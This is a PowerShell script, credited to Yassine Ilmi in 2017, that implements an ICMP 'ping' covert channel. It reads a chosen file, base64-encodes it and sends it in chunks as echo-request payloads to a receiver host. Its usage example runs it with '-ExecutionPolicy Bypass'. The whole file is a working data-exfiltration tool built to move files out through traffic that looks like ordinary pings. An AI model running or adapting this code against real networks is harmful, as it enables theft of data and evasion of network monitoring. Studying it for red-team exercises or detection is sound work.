#requires -version 1
<#
.SYNOPSIS
  Ping simple covert channel

.DESCRIPTION
  Use ICMP echo request to send binary data as the packet payload 

.PARAMETER Destination
  The receiver

.PARAMETER File
  The file we want to send through ICMP echo requests

.PARAMETER PayloadSize
  By default we're using a 32Bytes payload size
   
.INPUTS
  None

.OUTPUTS
  <Outputs if any, otherwise state None - example: Log file stored in C:\Windows\Temp\<name>.log>

.NOTES
  Version:        1.0
  Author:         Yassine Ilmi - yassine.at.ilmi.dot.fr
  Contributor:    Pedro Laguna
  Creation Date:  16/06/2017
  Purpose/Change: Ping simple covert channel
  
.EXAMPLE
  ping-client.ps1 my.server.com /path/to/my/file 32
  powershell.exe -ExecutionPolicy Bypass ping-client.ps1 my.server.com 32 
#>

#----------------------------------------------------------[Declarations]----------------------------------------------------------

$ScriptVersion = "1.0"

#-----------------------------------------------------------[Functions]------------------------------------------------------------
Function pingTransferClient{
  Param(
    [parameter(Mandatory=$true,Position=0)]
    [string]
    $Destination = $false,
    [parameter(Mandatory=$true,Position=1)]
    [string]
    $File = $false,
    [parameter(Mandatory=$false,Position=2)]
    [string]
    $PayloadSize = $false
  )
  
  Process{
    Try{

      if($PayloadSize){
        $sliceSize = $PayloadSize
      }
      else {
        $sliceSize = 32
      }

      #Starting stopwatch to measure execution time
      $StopWatch = [System.Diagnostics.Stopwatch]::StartNew()

      #Reading the file to base64
      $binaryFile = [System.IO.File]::ReadAllBytes($File)
      $base64File = [System.Convert]::toBase64String($binaryFile).toCharArray()

      #Dividing filesize by chunksize to determine how many pings we will need
      $slicesNumber = [Math]::Ceiling($base64File.count / $sliceSize) 


      #Looping for each chunk to slice and send the data
      for($slice=0;$slice -lt $slicesNumber;$slice++){

        $sendBuffer = $null

        for ($char=0;$char -lt $sliceSize;$char++){
          $sendBuffer += $base64File[($slice*$sliceSize)+$char]
        }

        Write-Output("Sending ping: "+$slice)
        $bytesSendBuffer = [System.Text.Encoding]::ASCII.GetBytes(($sendBuffer))
        $Ping = [System.Net.NetworkInformation.Ping]::new() 
        $Ping.Send($Destination,60,$bytesSendBuffer)

      }
      #Stopping stopwatch to print results
      $StopWatch.Stop()
      $ElapsedSeconds = [math]::Round($StopWatch.Elapsed.TotalSeconds,2)
      Write-Output("Execution took " + $ElapsedSeconds + " seconds")
    }  
    Catch{
      Write-Output($_.Exception)
      Break
    }
  }
  
  End{
    If($?){
      Write-Output("Operation completed successfully")
    }
  }
}


#-----------------------------------------------------------[Execution]------------------------------------------------------------

#Script Execution goes here
pingTransferClient $args[0] $args[1] $args[2]
